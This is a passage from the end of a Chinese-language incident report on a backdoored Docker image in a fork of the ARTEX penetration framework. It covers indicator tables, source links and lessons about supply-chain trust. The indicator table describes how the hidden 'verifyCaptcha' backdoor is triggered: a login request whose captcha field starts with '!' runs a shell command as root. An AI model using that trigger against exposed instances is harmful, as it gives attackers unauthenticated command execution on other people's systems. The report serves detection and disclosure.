| 投毒 commit | `trhhubsd/ARTEX a4f4d38c7b60f68abbd6a574aa59188063f2d86c`<br><br>（仅改 `docker-compose.yml` ） |
| 源码侧对照 | `e6ec569`<br><br>/ `v0.3.15` ， `server/auth.go` 无相关符号 |

### 13.2 网络与行为

| 类型  | 值   |
| --- | --- |
| 受影响端口 | `8787`<br><br>（若对外映射，视同已沦陷）、 `8788` |
| 触发路径 | `POST /api/auth/login` |
| 触发字段 | JSON `captcha` ，首字符 `!` |
| 特征响应 | `200`<br><br>\+ `Content-Length: 55` + 体含 `"captcha"` |
| 正常基线 | `401`<br><br>\+ `Content-Length: 37` + {"error":"用户名或密码错误"} |
| 执行载体 | 容器内 `sh -c <payload>` ， `CombinedOutput()` 回显 |
| 权限  | 容器内 `uid=0` |

### 13.3 项目与情报地址摘录

| 对象  | 地址  | 状态  |
| --- | --- | --- |
| 原项目（Autumn-27） | `https://github.com/Autumn-27/ARTEX` | 404（已闭源） |
| 受害 fork | `https://github.com/trhhubsd/ARTEX` | 404（已删除） |
| 事件 Issue | `trhhubsd/ARTEX`<br><br>Issue #7《这个项目有一个活跃的后门，无法关闭》 | 随仓库失效 |
| 官方镜像 | `autumn27/artex`<br><br>（Docker Hub） | 参考基线 |
| 国际版分支 | `https://github.com/jiwoochris/artex-global` | 存续，2,990★，AGPL-3.0 |
| 社区维护分支 | `https://github.com/RuoJi6/ARTEX` | 存续，1,506★ / 892 fork |
| 韩方分支 | `https://78researchlab.com/artex` | 已"배포 중단" |
| 官方漏洞公告 | `GHSA-q4j5-2wwq-gmq5`<br><br>（未初始化实例接管 / 默认公网绑定 / 无登录限速） | 有效  |

## 14\. 参考来源

1.  微信公众号「Hacking黑白红」：《黑客AI工具ARTEX 二开被投毒！你 pull 的那个 Docker 镜像，可能是别人的后门》，2026-11-04 23:59 —— [原文](https://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247557861&idx=1&sn=890de2b98dcbf74d07731a8315b259e7&scene=21#wechat_redirect)
    
2.  FreeBuf：《【打不过就加入？】"棒子"被ARTEX干懵了之后，选择了对其进行二开....》，2026-10-21 —— 链接
    
3.  蓝点网：《国内安全公司微步在线发布声明拥有ARTEX渗透框架版权 相关开源版二开也必须开源》，2026-11-06 —— 链接
    
4.  0XU/网络尖刀 转载同上 —— 链接
    
5.  清霜之辰《AI 日报》：《ARTEX：冠军渗透框架一周后被用于韩国金融窃密》，2026-10-09 —— 链接
    
6.  GitHub Security Advisory `GHSA-q4j5-2wwq-gmq5` —— 链接
    
7.  scanrepo 启发式扫描报告（ `trhhubsd/artex` 、 `RuoJi6/ARTEX` ）—— 链接
    
8.  78 Research Lab 官方页（배포 중단 公告） —— 链接
    

> 注：本文中所有截图均转载自上述公开来源，用于取证留档；截图内的原始时间戳、hash、HTTP 报文未作任何修改。

## 15\. 这件事真正教了什么

1.  **开源停止维护，不等于风险下降，而是风险转移**——从"作者是否可靠"转移到"每一个 fork 维护者是否可靠"。
    
2.  `docker compose up -d` \*\* 是现代版的 \*\* `curl | bash` 。它把构建权、分发权、执行权一次性交给了一个陌生人。
    
3.  **源码干净是最危险的信号**。它让人放心地把审计结论套用到制品上——而制品才是真正跑起来的东西。
    
4.  **7,954 次拉取、0 次公开告警**：说明这批人（安全从业者）具备检测能力，却没有检测动作。工具信任的惯性，比技术缺陷更难修。
    
5.  **本次后门的"优雅"在于语义伪装**：它不叫 `backdoor` ，它叫 `verifyCaptcha` 。写代码的人和读代码的人，都会被"合理命名"骗过去。
    

**最后一条，也是最刺人的一条**：

> 一个用来"发现别人系统漏洞"的工具，自己成了一个未认证 WebShell 的宿主。防御的起点，从来不是别人，是自己 `docker pull` 的那一下。

工具使用 · 目录

作者提示: 个人观点，仅供参考
